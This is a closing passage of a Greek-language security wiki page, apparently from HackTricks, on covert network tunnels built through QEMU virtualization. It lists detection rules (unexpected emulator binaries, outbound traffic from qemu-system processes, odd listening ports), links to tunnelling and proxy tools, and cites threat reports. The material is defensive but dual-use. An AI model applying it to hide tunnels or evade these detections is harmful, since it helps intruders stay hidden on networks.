• Ειδοποιήστε για **μη αναμενόμενα QEMU/VirtualBox/KVM binaries** σε διαδρομές εγγράψιμες από χρήστη.  
• Αποκλείστε εξερχόμενες συνδέσεις που προέρχονται από `qemu-system*.exe`.  
• Αναζητήστε σπάνιες θύρες ακρόασης (2222, 10022, …) που δεσμεύονται αμέσως μετά την εκκίνηση ενός QEMU.

---

## Άλλα εργαλεία για έλεγχο

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## Αναφορές

- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)

{{#include ../banners/hacktricks-training.md}}
